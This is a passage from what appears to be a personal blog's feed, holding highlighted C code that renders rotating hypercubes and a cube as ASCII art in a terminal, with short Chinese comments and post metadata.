&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">/*测试代码：打印normalLink</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2*face;i++)&#123;</span></span><br><span class="line"><span class="comment">        //if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">        //else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(normalLink[i*3+j]&gt;=10) printf(&quot;%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">            else printf(&quot;0%d, &quot;,normalLink[i*3+j]);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;normalLink Above\n&quot;);</span></span><br><span class="line"><span class="comment">    //*/</span></span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="comment">//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;<span class="comment">//大循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);</span><br><span class="line">            &#125;<span class="comment">//初始化</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));<span class="comment">//还原vex到初始状态，否则带角加速度</span></span><br><span class="line">        <span class="comment">//计算向量与旋转矩阵相乘，0太多，没必要搞真正的矩阵乘法</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;<span class="comment">//限定旋转次数；rotateAround每行2个元素，j的作用是选取他们</span></span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)<span class="comment">//遍历所有的轴</span></span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])<span class="comment">//当前轴是被旋转轴时，结果符合旋转矩阵计算结果</span></span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;<span class="comment">//摄像机旋转</span></span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//以透视投影降维</span></span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];<span class="comment">//备份x，y轴用于计算平面方程</span></span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;<span class="comment">//d+1 = 当前维数</span></span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;<span class="comment">//趁还在三维的时候先把法向量算了，不然反光的面就也透视了</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;<span class="comment">//以全局质心计算，使法向量向外</span></span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)<span class="comment">//vexIndex：第几个向量，axis：该向量的第几个元素</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);</span><br><span class="line">            <span class="comment">/*测试代码：打印vexProjected</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;vexNum/dimension&amp;&amp;d&gt;2;i++)&#123;</span></span><br><span class="line"><span class="comment">                if(i&lt;10) printf(&quot; %d= &quot;,i);</span></span><br><span class="line"><span class="comment">                else printf(&quot;%d= &quot;,i);</span></span><br><span class="line"><span class="comment">                for(int j=0;j&lt;dimension;j++)&#123;</span></span><br><span class="line"><span class="comment">                    if(vexProjected[i*dimension+j]&gt;=0)printf(&quot; %.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                    else printf(&quot;%.2f,&quot;,vexProjected[i*dimension+j]);</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            if(d&gt;2) printf(&quot;VexPorjected Above , dimension = %d\n&quot;,d);</span></span><br><span class="line"><span class="comment">            //*/</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//输出到out_f[]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//当前三角形质心</span></span><br><span class="line">                    <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                        tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                        y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                        tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                        z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                        xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                        yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    tCenter[<span class="number">0</span>]/=<span class="number">3</span>;</span><br><span class="line">                    tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;<span class="comment">//判断当前屏幕的点是否在三角形范围内</span></span><br><span class="line">                        <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                                ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                                &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                            inside=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(inside)&#123;</span><br><span class="line">                        <span class="comment">/*测试代码：方程阈值检验</span></span><br><span class="line"><span class="comment">                        if(sx==0)&#123;</span></span><br><span class="line"><span class="comment">                            for(int i=0;i&lt;3&amp;&amp;inside;i++)&#123;</span></span><br><span class="line"><span class="comment">                                double b=(tCenter[1]-y[i==0?1:i==1?0:0])*(x[i==0?2:i==1?2:1]-x[i==0?1:i==1?0:0]);</span></span><br><span class="line"><span class="comment">                                double c=(y[i==0?2:i==1?2:1]-y[i==0?1:i==1?0:0])*(tCenter[0]-x[i==0?1:i==1?0:0]);\</span></span><br><span class="line"><span class="comment">                                double d=b-c;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                        //*/</span></span><br><span class="line">                        <span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                        <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">else</span>&#123;<span class="comment">//求三角形平面方程算出点到屏幕距离</span></span><br><span class="line">                            p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                            p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                            currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                            <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                                alpha=<span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                                dis[sy][sx]=currentDis;</span><br><span class="line">                                out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="comment">///*输出到终端</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c%c&quot;</span>,shade[outIndex],shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(<span class="number">15</span>);</span><br><span class="line">        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p align="right"><small>Correct, but not totally correct, meet hypercubes O(∩_∩)O</small></p>    </div></div><link rel="stylesheet" href="/kyriota/css/spoiler.css" type="text/css"><script src="/kyriota/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;p&gt;Meet Hypercubes~ O(∩_∩)O&lt;/p&gt;
&lt;p&gt;🦎语言渲染n维立方体至终端，那真是非常amazing啊&lt;/p&gt;
&lt;img src=&quot;/images/4Hypercube-transparent.gif&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt;</summary>
    
    
    
    <category term="摸鱼" scheme="https://kyriota.github.io/categories/%E6%91%B8%E9%B1%BC/"/>
    
    
    <category term="图形学" scheme="https://kyriota.github.io/tags/%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>图形学HelloWorld</title>
    <link href="https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/"/>
    <id>https://kyriota.github.io/2021/04/19/%E5%9B%BE%E5%BD%A2%E5%AD%A6HelloWorld/</id>
    <published>2021-04-18T17:24:55.000Z</published>
    <updated>2021-04-20T18:19:18.368Z</updated>
    
    <content type="html"><![CDATA[<p>逛b站看到会转的甜甜圈，对图形学有点上头，自己拿蜥语言做个立方体玩玩</p><img src="/images/图形学HelloWorld.gif" height="200" width="200" /><span id="more"></span><h1 id="图形学HelloWorld"><a href="#图形学HelloWorld" class="headerlink" title="图形学HelloWorld"></a>图形学HelloWorld</h1><p>既然是HelloWorld那就没什么好解释的了O(∩_∩)O</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 51<span class="comment">//规定屏幕大小</span></span></span><br><span class="line"><span class="comment">////cal_r用来算个模长</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">cal_r</span><span class="params">(<span class="keyword">float</span> x,<span class="keyword">float</span> y,<span class="keyword">float</span> z)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(x*x+y*y+z*z);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.,;!o*m0&amp;%@&quot;</span>;<span class="comment">//阴影字符集</span></span><br><span class="line"><span class="keyword">int</span> out_i[size][size];<span class="comment">//记录亮度，映射到字符集</span></span><br><span class="line"><span class="keyword">float</span> dyn=<span class="number">4.0</span>;<span class="comment">//开合幅度</span></span><br><span class="line"><span class="keyword">float</span> a=<span class="number">8.0</span>;<span class="comment">//立方体边长</span></span><br><span class="line"><span class="keyword">float</span> delta=<span class="number">0.75</span>;<span class="comment">//遍历立方体的步长</span></span><br><span class="line"><span class="keyword">float</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;<span class="comment">//从坐标原点偏移到屏幕中心所需的偏移量</span></span><br><span class="line"><span class="keyword">float</span> dis[size][size];<span class="comment">//记录最小距离，由此判断遮罩关系</span></span><br><span class="line"><span class="comment">//cal_shade用来算个阴影</span></span><br><span class="line"><span class="comment">//Par&#123;n_i是被选中相对不变的方向,相当于此方向穿过平面;n_j作为判定是上平面还是下平面的值，只可能是1或-1&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cal_shade</span><span class="params">(<span class="keyword">float</span> *n,<span class="keyword">int</span> n_i,<span class="keyword">int</span> n_j,<span class="keyword">float</span> *ro_a,<span class="keyword">float</span> *ro_b,<span class="keyword">float</span> *ro_c,<span class="keyword">float</span> *light,<span class="keyword">float</span> rotate,<span class="keyword">int</span> *out_i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)n[i]=i==n_i?n_j:<span class="number">0</span>;<span class="comment">//确定原始法向量n[]</span></span><br><span class="line">    <span class="keyword">float</span> n_a[<span class="number">3</span>]=&#123;n[<span class="number">0</span>]*ro_a[<span class="number">0</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">3</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">6</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">1</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">4</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">7</span>],</span><br><span class="line">                   n[<span class="number">0</span>]*ro_a[<span class="number">2</span>]+n[<span class="number">1</span>]*ro_a[<span class="number">5</span>]+n[<span class="number">2</span>]*ro_a[<span class="number">8</span>]&#125;;<span class="comment">//法向量第一次旋转</span></span><br><span class="line">    <span class="keyword">float</span> n_b[<span class="number">3</span>]=&#123;n_a[<span class="number">0</span>]*ro_b[<span class="number">0</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">3</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">6</span>],</span><br><span class="line">                   n_a[<span class="number">0</span>]*ro_b[<span class="number">1</span>]+n_a[<span class="number">1</span>]*ro_b[<span class="number">4</span>]+n_a[<span class="number">2</span>]*ro_b[<span class="number">7</span>],</span><br><span class="line">                   n_a[<span 